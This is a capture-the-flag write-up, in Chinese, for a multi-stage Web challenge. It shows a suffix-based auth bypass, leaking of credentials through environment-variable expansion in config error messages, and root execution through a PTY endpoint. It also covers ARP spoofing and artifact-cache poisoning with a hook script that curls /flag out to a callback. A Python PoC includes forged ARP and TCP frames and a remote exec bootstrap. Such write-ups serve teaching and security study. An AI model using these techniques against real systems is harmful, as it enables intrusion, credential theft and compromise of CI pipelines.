# fault_web_and_fault_hash

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 分类 | Web |
| 形态 | 信息题 |
| 附件 | 无 |
| 目标 | http://<TARGET_IP>:<TARGET_PORT>/ |

Flag：flag{动态容器已脱敏}

## 2. 题目分析

题目提供动态Web入口，应用后端为`CyberStrike`。直接访问只能看到普通页面，核心利用点不在业务功能，而在鉴权中间件、插件配置加载和同网段CI缓存信任链。

```text
http://<TARGET_IP>:<TARGET_PORT>/
  -> 利用静态资源后缀白名单绕过/auth鉴权
  -> 写入临时wellknown配置源
  -> 服务端拉取可控base64反射内容
  -> 利用环境变量替换破坏JSON并回显配置
  -> 泄漏应用Basic Auth凭据
  -> /pty+WebSocket进入应用容器root
  -> 在内网二层发现cache与runner
  -> ARP欺骗runner，伪造成artifact cache响应
  -> 投递含restore-hook.sh的tar.gz
  -> runner解包执行并回连/flag
```

- `/auth`接口本应要求认证，但路径以`.js`结尾时会命中静态资源放行逻辑。
- `wellknown`配置源允许由玩家控制，服务端会主动发起请求。
- 配置加载先把`{env:VAR}`展开成环境变量明文，再交给JSONC解析器。
- 解析失败时异常信息会回显展开后的完整配置文本。
- 获取应用的Basic凭据后，可以通过PTY和WebSocket在应用容器内以root执行代码。
- runner会主动恢复一个artifact cache归档，且信任其中的`archiveLocation`。
- 应用容器具备`CAP_NET_RAW`，与cache、runner处于同一二层网络，可在正确网卡上做ARP欺骗和原始TCP响应注入。

第一阶段定位：入口的根路径`/`与`/auth/:providerID`都无需认证即可到达，前者触发配置加载，后者可写入配置源；凭据泄漏完全由这两个端点配合完成，后续所有阶段都以泄漏出的Basic凭据为起点。

## 3. 解题过程

### 3.1 认证绕过与凭据泄漏

鉴权逻辑对静态资源只做后缀判断：

```ts
if (
  path === "/" ||
  path.startsWith("/assets/") ||
  /\.(html|js|css|png|jpg|svg|ico|woff2?|ttf|webmanifest|map)$/i.test(path)
) {
  return next();
}
```

该判断不限制请求方法与API前缀。`/auth/:providerID`中的`providerID`是路径参数，只要让整条路径最终以`.js`结尾，即可无认证调用：

```http
PUT /auth/<URL编码后的providerID> HTTP/1.1
Host: <TARGET_IP>:<TARGET_PORT>
Content-Type: application/json

{"type":"wellknown","key":"<ENV_KEY>","token":"\""}
```

加载配置时，后端把`key`/`token`写入进程环境变量，再访问由`providerID`拼出的配置源，并把响应中的`config`字段交给`Config.load()`。`providerID`可以是外部URL，构成SSRF式拉取；`token`的值（一个双引号）会成为任意环境变量的值。

为了同时满足`.js`结尾与可控JSON，`providerID`指向一个base64反射端点：

```text
providerID = https:<REFLECTOR_HOST>\base64\<BASE64>?x=<NONCE>.js
```

规范化后后端实际请求`https://<REFLECTOR_HOST>/base64/<BASE64>?x=<NONCE>.js/.well-known/cyberstrike`，反射端点解码`<BASE64>`返回，附加路径落在query中不影响内容。`<BASE64>`解码为：

```json
{
  "config": {
    "username": "<MARK_US>{env:CYBERSTRIKE_SERVER_USERNAME}<MARK_UE>",
    "password": "<MARK_PS>{env:CYBERSTRIKE_SERVER_PASSWORD}<MARK_PE>",
    "bad": "{env:<ENV_KEY>}",
    "_pad": 0
  }
}
```

环境变量先展开、后解析，`bad`展开成孤立的双引号使JSON非法，异常信息回显展开后的完整文本；username/password 两侧的marker可直接截取。base64结果不能含`+`和`/`（会被HTTP路径拆分），通过递增`_pad`直到编码只含路径安全字符。

写入后请求根路径触发`Config.get()`，并用`./`与`.//`的64位随机组合拼接`directory`，所有组合归一化到同一临时目录但字符串不同，可避开配置与实例缓存：

```http
GET /?directory=<64段./与.//组合> HTTP/1.1
Host: <TARGET_IP>:<TARGET_PORT>
```

从回显中取出凭据后转成Basic头，请求`/global/health`确认`healthy`为真即完成第一阶段。

### 3.2 PTY进入应用容器

`/pty`接口以Basic凭据鉴权，直接创建Python进程作为命令执行入口：

```http
POST /pty?directory=<REMOTE_TEMP_DIR> HTTP/1.1
Authorization: Basic <BASE64_USER_PASS>
Content-Type: application/json

{"command":"python3","args":["-u","-c","<BOOTSTRAP>"],"cwd":".","title":"probe"}
```

响应返回`id`。随后连接`ws(s)://<ENTRY_AUTHORITY>/pty/<PTY_ID>/connect?directory=<REMOTE_TEMP_DIR>`，发送分片。

`BOOTSTRAP`关闭PTY回显，从stdin逐行读取base64分片，遇到`__INPUT_DONE__`后zlib解压并`exec`远程阶段代码。应用容器原本以root运行且保留`CAP_NET_RAW`，远程阶段可直接构造二层帧。若命令立即退出，WebSocket握手可能尚未完成而连接失败，bootstrap需保持进程存活到收发结束。

### 3.3 内网侦察与网卡选择

进入容器后先用UDP`connect()`让内核选出到达cache的源IP，该调用不实际发包：

```python
probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
probe.connect((CACHE_IP, CACHE_PORT))
app_ip = probe.getsockname()[0]
probe.close()
```

遍历`socket.if_nameindex()`，用`ioctl(SIOCGIFADDR, 0x8915)`找到持有`app_ip`的接口，再从`/sys/class/net/<iface>/address`读取MAC。默认路由所在接口不一定连接cache与runner，ARP欺骗必须绑定到实际业务网卡；cache与runner的MAC通过原始ARP请求解析。

侦察结论：

- 应用容器：root，具备`CAP_NET_RAW`，至少一个业务接口。
- 缓存服务：GitHub Actions artifact cache风格接口，直接访问返回未授权。
- runner服务：只有有限健康检查，任务协议不需要攻击。
- filehub：仅静态首页，属于诱饵。
- 应用容器内没有部署脚本、Docker socket或共享卷。

突破口因此不是runner的HTTP API，而是runner后续自动执行的缓存恢复流程。

### 3.4 artifact cache投毒

runner先查询缓存并自带token：

```http
GET /_apis/artifactcache/cache?keys=<CACHE_KEY>&version=<VERSION> HTTP/1.1
Authorization: Bearer <RUNNER_TOKEN>
```

命中响应中的`archiveLocation`指向下载地址，runner随后下载tar.gz并在恢复阶段执行归档根目录的`restore-hook.sh`。攻击者无需破解token：向runner持续发送`<CACHE_IP> is-at <APP_MAC>`的ARP回复后，runner发往cache的帧进入应用网卡，直接应答其已带token的请求即可。

ARP只针对runner，其他帧转发给真实cache MAC，结束后向runner恢复真实缓存MAC，避免网络中断。TCP响应从请求帧中取`client_seq=TCP.seq`、`server_seq=TCP.ack`，确认号为`client_seq+len(HTTP_PAYLOAD)`，源IP/端口为cache侧、目的为runner侧，flags为`PSH|ACK`，重算IP首部与TCP伪首部校验和，并带`Content-Length`与`Connection: close`；后者让lookup连接结束，下载请求改用新源端口，便于识别。

lookup注入体：

```json
{"cacheKey":"<CACHE_KEY>","archiveLocation":"http://<CACHE_SERVICE>:<CACHE_PORT>/_apis/artifactcache/download/<PAYLOAD_ID>"}
```

归档只含一个可执行的`restore-hook.sh`，读取runner容器中的`/flag`并POST到应用容器的临时回调端口，不可读时回传诊断：

```sh
#!/bin/sh
P=/tmp/p.$$
if [ -r /flag ]; then cat /flag > "$P"; U=/flag; else id > "$P" 2>&1; U=/diag; fi
curl -sS -m 8 -X POST --data-binary @"$P" "http://<APP_IP>:<CALLBACK_PORT>$U"
```

回调端对收到的数据先`strip()`再计算摘要，因为flag文件通常带末尾换行，直接对原始字节取`sha256`会与平台下发的哈希不一致：

```python
clean = data.strip()
digest = hashlib.sha256(clean).hexdigest()
```

## 4. PoC

```python
import base64, hashlib, json, secrets, socket, struct, sys, zlib
from urllib.parse import quote
import requests, websocket

ENTRY = "http://<TARGET_IP>:<TARGET_PORT>"
REFLECTOR = sys.argv[2]
BOOTSTRAP = (
    "import base64,sys,termios,zlib\n"
    "fd=sys.stdin.fileno();a=termios.tcgetattr(fd);a[3]&=~termios.ECHO\n"
    "termios.tcsetattr(fd,termios.TCSANOW,a);c=[]\n"
    "while True:\n"
    " l=sys.stdin.readline().strip()\n"
    " if l=='__INPUT_DONE__':break\n"
    " c.append(l)\n"
    "exec(compile(zlib.decompress(base64.b64decode(''.join(c))),'<s>','exec'))\n")

def checksum(data):
    if len(data) & 1: data += b"\x00"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while total >> 16: total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF

def arp_reply(raw, app_mac, cache_ip, runner_mac, runner_ip):
    body = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2) + app_mac + socket.inet_aton(cache_ip)
    raw.send(runner_mac + app_mac + b"\x08\x06" + body + runner_mac + socket.inet_aton(runner_ip))

def tcp_reply(frame, tcp_off, req_len, body, cache_ip, cache_port, runner_ip, app_mac, runner_mac):
    src_port = struct.unpack_from("!H", frame, tcp_off)[0]
    client_seq, server_seq = struct.unpack_from("!II", frame, tcp_off + 4)
    http = (b"HTTP/1.1 200 OK\r\nContent-Length: " + str(len(body)).encode()
            + b"\r\nConnection: close\r\n\r\n" + body)
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40 + len(http), 0, 0x4000, 64, 6, 0,
                     socket.inet_aton(cache_ip), socket.inet_aton(runner_ip))
    ip = ip[:10] + struct.pack("!H", checksum(ip)) + ip[12:]
    tcp = struct.pack("!HHIIBBHHH", cache_port, src_port, server_seq,
                      (client_seq + req_len) & 0xFFFFFFFF, 5 << 4, 0x18, 65535, 0, 0)
    pseudo = (socket.inet_aton(cache_ip) + socket.inet_aton(runner_ip)
              + struct.pack("!BBH", 0, 6, len(tcp) + len(http)))
    tcp = tcp[:16] + struct.pack("!H", checksum(pseudo + tcp + http)) + tcp[18:]
    return runner_mac + app_mac + b"\x08\x00" + ip + tcp + http

def leak_credentials():
    nonce = secrets.token_hex(8)
    env_key = "PARSE_BREAK_" + nonce.upper()
    marks = ["__M_%s_%d__" % (nonce, i) for i in range(4)]
    config = {
        "username": marks[0] + "{env:CYBERSTRIKE_SERVER_USERNAME}" + marks[1],
        "password": marks[2] + "{env:CYBERSTRIKE_SERVER_PASSWORD}" + marks[3],
        "bad": "{env:" + env_key + "}",
        "_pad": 0,
    }
    for pad in range(10000):
        config["_pad"] = pad
        blob = base64.b64encode(json.dumps({"config": config}, separators=(",", ":")).encode()).decode()
        if "+" not in blob and "/" not in blob: break
    else:
        raise RuntimeError("no path-safe base64")
    auth = ENTRY + "/auth/" + quote("https:%s\\base64\\%s?x=%s.js" % (REFLECTOR, blob, nonce), safe="")
    requests.put(auth, json={"type": "wellknown", "key": env_key, "token": '"'}, timeout=20)
    bits = format(int(nonce, 16), "064b")
    directory = "/tmp/" + "".join("./" if b == "1" else ".//" for b in bits)
    text = requests.get(ENTRY + "/?directory=" + quote(directory, safe=""), timeout=20).text
    requests.delete(auth, timeout=20)
    return (text.split(marks[0], 1)[1].split(marks[1], 1)[0],
            text.split(marks[2], 1)[1].split(marks[3], 1)[0])

def spawn_pty(credentials, remote_source, directory):
    token = base64.b64encode(("%s:%s" % credentials).encode()).decode()
    auth = {"Authorization": "Basic " + token}
    body = {"command": "python3", "args": ["-u", "-c", BOOTSTRAP], "cwd": ".", "title": "probe"}
    pty_id = requests.post(ENTRY + "/pty", params={"directory": directory},
                           headers=auth, json=body, timeout=20).json()["id"]
    ws = websocket.create_connection(
        ENTRY.replace("http", "ws", 1) + "/pty/" + quote(pty_id, safe="")
        + "/connect?directory=" + quote(directory, safe=""), header=list(auth.items()), timeout=30)
    blob = base64.b64encode(zlib.compress(remote_source.encode(), 9)).decode()
    for i in range(0, len(blob), 1000):
        ws.send(blob[i:i + 1000] + "\n")
    ws.send("__INPUT_DONE__\n")
    chunk = b""
    while not chunk or ("__STAGE_DONE__" not in chunk and "__STAGE_FATAL__" not in chunk):
        chunk = ws.recv()
    ws.close()
```
